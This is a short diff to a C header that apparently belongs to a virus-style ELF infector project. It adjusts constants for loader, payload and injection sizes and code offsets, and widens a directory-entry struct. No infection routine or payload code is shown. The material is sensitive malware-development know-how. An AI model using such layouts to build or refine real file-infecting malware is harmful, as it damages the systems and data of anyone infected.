@@ -17,15 +17,15 @@
 
 # define FT_MEMCPY_ADDR 0x11C0
 # define BUF_SIZE 0x20
-# define END_SIZE 0x37
-# define LOADER_SIZE 0x4B
-# define PAYLOAD_SIZE 0x22cd - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x225d - FT_MEMCPY_ADDR
+# define END_SIZE 0x5B
+# define LOADER_SIZE 0x57
+# define PAYLOAD_SIZE 0x23ae - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x233e - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
-# define OFFSET_1 0x1a80 - FT_MEMCPY_ADDR
-# define OFFSET_2 0x1ba5 - FT_MEMCPY_ADDR
-# define OFFSET_3 0x1ce4 - FT_MEMCPY_ADDR
+# define OFFSET_1 0x1b55 - FT_MEMCPY_ADDR
+# define OFFSET_2 0x1c7a - FT_MEMCPY_ADDR
+# define OFFSET_3 0x1dc5 - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -53,7 +53,7 @@ struct linux_dirent64 {
 	off64_t        d_off;    /* 64-bit offset to next structure */
 	unsigned short d_reclen; /* Size of this dirent */
 	unsigned char  d_type;   /* File type */
-	char           d_name[]; /* Filename (null-terminated) */
+	char           d_name[PATH_MAX]; /* Filename (null-terminated) */
 };
 
 void		loader();
